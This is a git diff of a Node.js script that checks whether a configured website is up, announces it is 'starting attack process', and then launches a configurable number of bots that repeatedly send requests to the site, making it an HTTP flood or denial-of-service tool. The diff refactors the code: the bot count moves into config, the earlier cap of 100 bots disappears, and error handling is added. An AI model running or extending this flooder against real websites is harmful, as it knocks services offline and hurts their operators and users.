@@ -2,34 +2,27 @@ import fs from 'fs-extra';
 import http from 'http';
 import https from 'https';
 import utils from './src/utils.js';
-import rl from 'readline-sync';
+
 const cwd = process.cwd();
 
 (async () => {
   const config = fs.readJSONSync(`${cwd}/config.json`);
-  const {
-    pingInterval,
-    checkInterval
-  } = config;
-  const { 
-    site, userAgent 
-  } = config.siteConfig;
+  const { pingInterval, checkInterval, siteConfig, numBots } = config;
+  const { site, userAgent } = siteConfig;
 
   console.log('[+]: Fetching site..');
-  utils.sleep(1500);
-
-  let numBots = rl.questionInt('Enter the number of bots (1-100): ');
-  numBots = Math.min(numBots, 100);
+  await utils.sleep(1500);
 
   const protocol = site.startsWith('https') ? https : http;
 
   try {
     protocol.get(site, (response) => {
       if (response.statusCode !== 200) {
-        utils.sleep(200);
-        console.log('[-]: Site is down.');
-      } else {
-        utils.sleep(200);
+        utils.sleep(200).then(() => console.log('[-]: Site is down.'));
+        return;
+      }
+
+      utils.sleep(200).then(() => {
         console.log('[+]: Site up!, starting attack process.');
 
         const ping = () => {
@@ -47,12 +40,14 @@ const cwd = process.cwd();
         for (let i = 0; i < numBots; i++) {
           setInterval(ping, pingInterval);
         }
-        
+
         setInterval(utils.checkSite, checkInterval);
-      }
+      });
+    }).on('error', (error) => {
+      utils.sleep(200).then(() => console.log('[-]: Site is down.'));
     });
   } catch (error) {
-    utils.sleep(1500);
+    await utils.sleep(1500);
     console.log(`[-]: An error occurred: ${error}`);
   }
 })();
